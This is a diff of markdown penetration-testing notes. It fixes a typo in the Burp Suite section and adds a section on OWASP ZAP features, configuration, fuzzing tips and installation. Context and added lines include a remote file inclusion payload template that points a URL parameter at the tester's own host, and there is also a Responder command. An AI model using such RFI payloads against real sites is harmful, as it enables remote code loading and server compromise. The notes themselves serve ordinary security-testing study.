@@ -2,7 +2,7 @@
 
 ## <mark style="color:green;">Burp Suite</mark>
 
-* Digital plattform tha collects tools for specialiced web penetration testing.
+* Digital plattform that collects tools for specialiced web penetration testing.
 * Framework written in Java that aims to provide a one-stop-shop for web application penetration testing
 * Capture and manipulate all of the traffic between an attacker and a webserver
 * Can intercept, view, and modify request
@@ -51,9 +51,52 @@ sudo responder -I $networkinterface
 
 * Make Remote file inclusion at page
 
+<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>http://$url/$query?$value=//$myip/somefile
+</strong></code></pre>
+
+***
+
+
+
+## <mark style="color:green;">ZAP</mark>
+
+* Proxy utility stands for Zed Attack Proxy
+
+### **Features**
+
+* **Contexts:** Delimit the scope of the scanning
+* **Spider:** Use spidering to get links in the code of a website
+* **Active scan:** Attacks the website to get more information
+* **Alerts:** Give vulnerabilities found on the web site
+* **Sites:** Shows all the URL spidered with their petitions and vulnerabilities
+* **History:** Shows petitions made to the site
+
+### **Configuration and utilities**
+
+* Install _SwitchyOmega_ extension
+* Configure server to _localhost_ and save changes
+* Go to _adds-on_ tab and from marletplace install: _all release, python scripting, community scripts, custom payloads, json view, jwt support, viewstate_.
+* Go to settings HUD deactivate _Using ZAP desktop and welcome message._
+
+### Tips
+
+* Can configure Global Alert Filters to set your own grade for a vulnerability.
+* From _History_ you can right click and select _Resend_ to modify a petition made before
+* **For fuzzing:**&#x20;
+  * Select a part of the request and right-click _Fuzz_&#x20;
+  * Select _Payloads_ button, select dictionary file or enter custom words
+  * In _Message Proccesor_s tab add a new one for exclude errors that arent meaningful
+  * In Global Settings go to _Anti-CSRF cert token_, an add the tokens detected in forms POST petitions
+  * When getting 304 responses in _Fuzz->Options_ activate _Follow Redirects_
+  * When not getting consistent token handle in _Fuzz->Options_ reduce the threads to 1
+
+### Commands
+
+* Installation
+
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-http://$url/$query?$value=//$myip/somefile
+sudo apt install zaproxy
 ```
 {% endcode %}
 
